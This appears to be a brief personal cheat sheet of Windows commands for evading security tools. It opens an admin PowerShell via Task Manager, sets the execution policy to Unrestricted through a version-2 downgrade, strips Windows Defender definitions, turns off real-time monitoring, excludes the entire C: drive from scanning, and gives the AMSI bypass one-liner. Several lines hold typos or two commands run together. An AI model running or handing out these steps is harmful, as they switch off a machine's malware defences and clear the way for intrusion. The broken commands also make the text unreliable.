 # Launch a program as Administrator via Task Manager:
"Start" "Task Manager" ENTER
Alt-F n "powershell" TAB SPACE ENTER
Alt-F n "cmd" TAB SPACE ENTER

# Privilege escalation?

powershell.exe -Version 2 -Command "& {Set-ExecutionPolicy -ExecutionPolicy Unrestricted}"

# Disable AV

"c:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DiableIOAVProtection $true



run this as admin to completely disable windows defender

Set-MpPreference -DisableRealtimeMonitoring $true



Then IN POWERSHELL
Add an exclusion to AV

Add-MpPreference -ExclusionPath "c:\"

and 

# Disable checking of malicious powershell

"[Ref].Assemply.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').Setvalue($null,$true)"